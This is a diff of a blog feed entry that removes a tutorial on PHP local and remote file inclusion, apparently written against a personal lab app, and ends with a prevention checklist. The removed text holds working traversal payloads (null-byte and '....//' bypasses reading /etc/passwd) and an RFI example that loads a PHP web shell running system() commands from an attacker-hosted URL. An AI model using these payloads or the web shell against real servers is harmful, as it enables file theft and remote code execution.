-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0YEJHBsxjODRJ0dbY00VPg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>You can change the language from English to Spanish or any other supported language by modifying the <code class="language-plaintext highlighter-rouge">lang</code> parameter.</p>
-
-<h4 id="step-1-recon-sending-a-random-input">Step 1: Recon Sending a Random Input</h4>
-
-<p>Let’s first send a random input, like <code class="language-plaintext highlighter-rouge">hello</code>, to see how the app responds:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-pagebypassnulbyte.php?lang=hello
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IdoVUKE4XynMV8wv-73hjA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>You get this error message:</p>
-
-<div class="alert-error">
-<strong>Warning:</strong> include(languages/hello.php): failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassnulbyte.php on line 97
-</div>
-
-<p>This error leaks important info: the app tries to include the file <code class="language-plaintext highlighter-rouge">languages/hello.php</code>. From this, we know two things:</p>
-
-<ul>
-  <li>
-    <p>The <code class="language-plaintext highlighter-rouge">lang</code> parameter value is appended with <code class="language-plaintext highlighter-rouge">.php</code> inside the <code class="language-plaintext highlighter-rouge">languages/</code> directory.</p>
-  </li>
-  <li>
-    <p>The file path is constructed like: <code class="language-plaintext highlighter-rouge">languages/{lang}.php</code>.</p>
-  </li>
-</ul>
-
-<p>Since the error message also reveals the full application path (<code class="language-plaintext highlighter-rouge">/home/wordisbond/Desktop/vulnauth/lfi/</code>), we can use it to plan directory traversal attacks.</p>
-
-<h4 id="step-2-attempt-directory-traversal">Step 2: Attempt Directory Traversal</h4>
-
-<p>If we want to access files outside the <code class="language-plaintext highlighter-rouge">languages</code> directory, we can try directory traversal like this:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-pagebypassnulbyte.php?lang=../../../../../etc/passwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K6K8few1RzMCb6EVykk4IA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>But we get another error:</p>
-
-<div class="alert-error">
-<strong>Warning:</strong> include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassnulbyte.php on line 97
-</div>
-
-<p>The <code class="language-plaintext highlighter-rouge">.php</code> extension is still appended, so the server tries to load <code class="language-plaintext highlighter-rouge">/etc/passwd.php</code> which doesn’t exist. This means the developer hard-coded <code class="language-plaintext highlighter-rouge">.php</code> after the input.</p>
-
-<h4 id="step-3-bypass-the-php-suffix-with-null-byte-injection">Step 3: Bypass the <code class="language-plaintext highlighter-rouge">.php</code> Suffix with Null Byte Injection</h4>
-
-<p>To bypass this, we can use the Null Byte (<code class="language-plaintext highlighter-rouge">%00</code>) injection technique. Null Byte is a special URL-encoded character (<code class="language-plaintext highlighter-rouge">%00</code>) that terminates strings in some older PHP versions. It tricks the include function to ignore everything after it.</p>
-
-<p>So if you send:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-pagebypassnulbyte.php?lang=../../../../../etc/passwd%00
-</code></pre>
-</div>
-
-<p>The include function will interpret:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-include("languages/../../../../../etc/passwd%00") . ".php");
-</code></pre>
-</div>
-
-<p>which effectively becomes:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-include("languages/../../../../../etc/passwd");
-</code></pre>
-</div>
-
-<p>and the file <code class="language-plaintext highlighter-rouge">/etc/passwd</code> will be included (if the PHP version is vulnerable).</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8ngaBwCBAy_qh4XmDeIKBg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<div class="alert-warning">
-<strong>Important Note:</strong> The Null Byte injection technique was fixed in PHP 5.3.4 and later versions. So, on modern PHP versions, %00 won't work anymore.
-</div>
-
-<h2 id="bypassing--filters-in-lfi">Bypassing <code class="language-plaintext highlighter-rouge">../</code> Filters in LFI</h2>
-
-<p>In our initial setup, the app lets us change the language using a <code class="language-plaintext highlighter-rouge">lang</code> parameter switching between English and Spanish:</p>
-
-<p><code class="language-plaintext highlighter-rouge">?lang=en.php
-?lang=es.php</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0NvWuC7mRFuZ77tpqJLiqw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cy_0X6KLS3d1WY_9TlC8OQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>But now the dev got a lil paranoid and added some basic input filtering specifically, they’re trying to block directory traversal by stripping <code class="language-plaintext highlighter-rouge">../</code> from the input.</p>
-
-<p>Let’s test this filter by trying to read a classic LFI target:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-lang=../../../../../../etc/passwd
-</code></pre>
-</div>
-
-<p>And we get the following PHP warning:</p>
-
-<div class="alert-error">
-<strong>Warning:</strong> include(languages/etc/passwd): Failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassslash.php on line 76
-</div>
-
-<div class="alert-error">
-<strong>Warning:</strong> include(): Failed opening 'languages/etc/passwd' for inclusion (include_path='.:/usr/share/php') in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassslash.php on line 76
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*owh85fQqNwGykARL0gpTDA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>If you look closely at the first line, you’ll notice that instead of including <code class="language-plaintext highlighter-rouge">../../etc/passwd</code>, PHP is trying to include:<br />
-<strong><code class="language-plaintext highlighter-rouge">languages/etc/passwd</code></strong></p>
-
-<p>So clearly, the app is <strong>stripping all <code class="language-plaintext highlighter-rouge">../</code> instances</strong> from the input via <code class="language-plaintext highlighter-rouge">str_replace('../', '', $_GET['lang'])</code>.</p>
-
-<hr />
-
-<h2 id="bypass-payload">Bypass Payload:</h2>
-
-<p>Try this sneaky payload instead:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-?lang=....//....//....//....//....//....//etc/passwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AYk1OB7xb0pSH-8cxXli2w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>And it works.</p>
-
-<hr />
-
-<h3 id="why-does-this-bypass-work">Why does this bypass work?</h3>
-
-<p>Because the filter only removes exact matches of <code class="language-plaintext highlighter-rouge">../</code>. It doesn’t normalize paths or do recursive cleanup. That means:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">....//</code> ≠ <code class="language-plaintext highlighter-rouge">../</code></p>
-  </li>
-  <li>
-    <p>So <code class="language-plaintext highlighter-rouge">str_replace('../', '', '....//etc/passwd')</code> leaves it untouched</p>
-  </li>
-  <li>
-    <p>The PHP engine still resolves <code class="language-plaintext highlighter-rouge">....//</code> to <code class="language-plaintext highlighter-rouge">../</code> under the hood during path resolution</p>
-  </li>
-</ul>
-
-<p>Here’s a visual to make it even clearer:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZtlXgty6DiQ8WWU6qMLCBw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-14zTekZ8H-LCLHLiBh5BQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<h2 id="bypassing-defined-directory-restrictions--input-validation">Bypassing Defined Directory Restrictions + Input Validation</h2>
-
-<p>When developers try to lock down Local File Inclusion (LFI) vulnerabilities, a common defense is forcing the user input to start with a defined directory for example, requiring <code class="language-plaintext highlighter-rouge">lang=languages/en.php</code>. This looks like a solid way to restrict file access, right?</p>
-
-<p>But attackers can still sneak through.</p>
-
-<p>If the app expects a URL like this:</p>
-
-<p><code class="language-plaintext highlighter-rouge">http://example.com/pagebypassslashdefineddirectory.php?lang=languages/en.php</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4lJhC3Acjxm244h_aQMs8g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>If you try to send a payload <strong>without</strong> the required directory prefix, like this:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-?lang=....//....//....//....//....//....//etc/passwd
-</code></pre>
-</div>
-
-<p>The application <em>rejects</em> it outright, showing an error message such as:</p>
-
-<div class="alert-error">
-Invalid path. Must begin with languages/
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k2VmHbm89LgRcf1MP65Z_A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This blocks direct traversal attempts that don’t start with <code class="language-plaintext highlighter-rouge">languages/</code>.</p>
-
-<p>However, you can still bypass the restriction by including the required directory prefix and then injecting traversal sequences, like so</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-?lang=languages/....//....//....//....//....//....//etc/passwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ELet6uZIW4a92t5L-Mc6EA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Here’s the trick:</p>
-
-<ul>
-  <li>
-    <p>The input <em>starts</em> with <code class="language-plaintext highlighter-rouge">languages/</code> to pass the check</p>
-  </li>
-  <li>
-    <p>The <code class="language-plaintext highlighter-rouge">....//</code> pattern works like <code class="language-plaintext highlighter-rouge">../</code> in file paths, letting you climb out of the intended directory</p>
-  </li>
-</ul>
-
-<p>This happens because input validation is often done with simple string replacements or prefix checks, missing the full path resolution context leaving the door wide open for crafty traversal bypasses.</p>
-
-<h2 id="remote-file-inclusion-rfi-a-hackers-backdoor-to-your-server">Remote File Inclusion (RFI) A Hacker’s Backdoor to Your Server</h2>
-
-<h3 id="what-is-rfi">What Is RFI?</h3>
-
-<p>Remote File Inclusion (RFI) is a high-severity web vulnerability that occurs when an application dynamically includes external files typically via user-supplied input <strong>without proper validation or sanitization</strong>. When exploited, an attacker can <strong>inject a remote URL</strong> into a file-handling function (like <code class="language-plaintext highlighter-rouge">include()</code>, <code class="language-plaintext highlighter-rouge">require()</code>, etc.), causing the server to fetch and execute malicious code hosted on an external server.</p>
-
-<p>For RFI to be possible, certain PHP configurations need to be enabled most notably:</p>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">allow_url_fopen = On</code></li>
-</ul>
-
-<p>This setting allows PHP to open external URLs as if they were local files, making the inclusion of remote payloads feasible.</p>
-
-<hr />
-
-<h3 id="why-is-rfi-so-dangerous">Why Is RFI So Dangerous?</h3>
-
-<p>Compared to Local File Inclusion (LFI), which is limited to reading files already present on the target server, <strong>RFI opens the door to Remote Code Execution (RCE)</strong> essentially giving attackers the ability to run arbitrary code <strong>from their own server</strong> on the victim system.</p>
-
-<p>Here are some nightmare scenarios that can result from a successful RFI attack:</p>
-
-<ul>
-  <li>
-    <p><strong>Sensitive Information Disclosure</strong> (e.g., config files, database credentials)</p>
-  </li>
-  <li>
-    <p><strong>Remote Code Execution (RCE)</strong> with full shell access</p>
-  </li>
-  <li>
-    <p><strong>Cross-Site Scripting (XSS)</strong> if the included file contains malicious JavaScript</p>
-  </li>
-  <li>
-    <p><strong>Denial of Service (DoS)</strong> by including large or malicious files</p>
-  </li>
-  <li>
-    <p><strong>Web Shell Uploads</strong> for post-exploitation access and persistence</p>
-  </li>
-</ul>
-
-<hr />
-
-<h3 id="how-does-an-rfi-attack-work">How Does an RFI Attack Work?</h3>
-
-<p>Let’s break this down with a step-by-step example:</p>
-
-<h4 id="scenario-vulnerable-php-web-app">Scenario: Vulnerable PHP Web App</h4>
-
-<p>You have a page like this:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://example.com/RFI.php?lang=en.php
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sTBdLcTf3GHgT3DYpYqOmg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>And the vulnerable code on the backend looks like this:</p>
-
-<p><code class="language-plaintext highlighter-rouge">&lt;?php
-    include($_GET['lang']);
-?&gt;</code></p>
-
-<p>The developer <strong>didn’t validate or sanitize</strong> the input. That’s the red flag.</p>
-
-<h4 id="step-by-step-exploitation">Step-by-Step Exploitation</h4>
-
-<ol>
-  <li>
-    <p><strong>Attacker Prepares Payload</strong>
-The attacker hosts a malicious file, for example:</p>
-
-    <ul>
-      <li>
-        <p>URL: <code class="language-plaintext highlighter-rouge">http://attacker.thm/cmd.txt</code></p>
-      </li>
-      <li>
-        <p>Content of <code class="language-plaintext highlighter-rouge">cmd.txt</code>:</p>
-      </li>
-    </ul>
-  </li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-php">
-&lt;?php
-
-echo "&lt;div style='
-    background-color: #111;
-    color: #0f0;
-    font-family: monospace;
-    padding: 20px;
-    border: 2px solid red;
-    border-radius: 10px;
-    text-align: center;
-'&gt;
-    &lt;h1&gt;💀 You Have Been Pwned 💀&lt;/h1&gt;
-    &lt;p&gt;RFI successful. Shell access granted.&lt;/p&gt;
-&lt;/div&gt;";
-
-if (isset($_GET['cmd'])) {
-    echo "&lt;pre style='background:#000; color:#0f0; padding:10px; border-radius:5px;'&gt;";
-    system($_GET['cmd']);
-    echo "&lt;/pre&gt;";
-} else {
-    echo "&lt;p style='color: #f33;'&gt;No command received. Try &lt;code&gt;?cmd=whoami&lt;/code&gt;&lt;/p&gt;";
-}
-
-?&gt;
-</code></pre>
-</div>
-
-<ol>
-  <li><strong>Attacker Sends Exploit Request</strong>
-They craft a URL to trick the server into loading their file:</li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://example.com/RFI.php?lang=http://10.0.2.15:8000/cmd.txt&amp;cmd=whoami
-  </code></pre>
-</div>
-
-<ol>
-  <li>
-    <p><strong>Server Fetches and Executes File</strong>
-If <code class="language-plaintext highlighter-rouge">allow_url_fopen</code> is enabled and no filtering is applied, the server will:</p>
-
-    <ul>
-      <li>
-        <p>Make a request to <code class="language-plaintext highlighter-rouge">attacker.thm</code></p>
-      </li>
-      <li>
-        <p>Fetch <code class="language-plaintext highlighter-rouge">cmd.txt</code></p>
-      </li>
-      <li>
-        <p>Inject and execute its contents within the application context</p>
-      </li>
-    </ul>
-  </li>
-  <li>
-    <p><strong>Code Execution</strong>
-The server runs whatever PHP is in, it could be a full PHP web shell (<code class="language-plaintext highlighter-rouge">system($_GET['cmd'])</code>, reverse shell, etc.)</p>
-  </li>
-</ol>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CUic41Xg4tJ3uV-29tGv4A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<h3 id="staying-sharp-defending-against-file-inclusion-vulnerabilities">staying Sharp: Defending Against File Inclusion Vulnerabilities</h3>
-
-<p>Web apps are dope, but if you’re not securing them right, you’re just leaving the door wide open for attackers. One of the most common issues? <strong>File Inclusion Vulnerabilities</strong> (think LFI, RFI). They’re sneaky, dangerous, and way too common in misconfigured PHP setups.</p>
-
-<h4 id="why-you-should-care">Why You Should Care</h4>
-
-<p>Understanding how these bugs work and how to prevent them is key to building (or hacking) safely. Whether you’re a dev, hacker, or just security-curious, here’s the lowdown on protecting your app from getting wrecked.</p>
-
-<hr />
-
-<h3 id="prevention-checklist">Prevention Checklist</h3>
-
-<p><strong>1. Keep everything updated.</strong>
-Your PHP version, CMS, frameworks, plugins if it runs code, it needs updates. Old versions = old vulnerabilities.</p>
-
-<p><strong>2. Hide your errors.</strong>
-Turn off PHP error reporting in production (<code class="language-plaintext highlighter-rouge">display_errors = Off</code>). You don’t wanna leak your file paths or internal structure to attackers.</p>
-
-<p><strong>3. Use a WAF.</strong><br />
-Web Application Firewalls can filter out sketchy requests before they reach your app. Tools like Cloudflare or ModSecurity can be lifesavers.</p>
-
-<p><strong>4. Lock down dangerous PHP features.</strong>
-If your app doesn’t use remote file access, disable these in <code class="language-plaintext highlighter-rouge">php.ini</code>:</p>
-
-<p><code class="language-plaintext highlighter-rouge">allow_url_fopen = Off
-allow_url_include = Off</code></p>
-
-<p><strong>5. Control input protocols.</strong>
-Limit the types of wrappers (e.g., <code class="language-plaintext highlighter-rouge">php://</code>, <code class="language-plaintext highlighter-rouge">data://</code>, <code class="language-plaintext highlighter-rouge">zip://</code>) your app can handle. Analyze what you <em>really</em> need and block the rest.</p>
-
-<p><strong>6. Sanitize &amp; validate all user input.</strong>
-Never trust user input. Use strict input validation. Assume attackers will try <code class="language-plaintext highlighter-rouge">....//</code>, null bytes, encoded payloads and block ‘em.</p>
-
-<p><strong>7. Whitelist &gt; Blacklist.</strong>
-Define exactly what files can be included, and from where. Don’t rely on just blacklisting risky strings like <code class="language-plaintext highlighter-rouge">../</code> it’s bypassable.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>Thank you for reading.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry></feed>
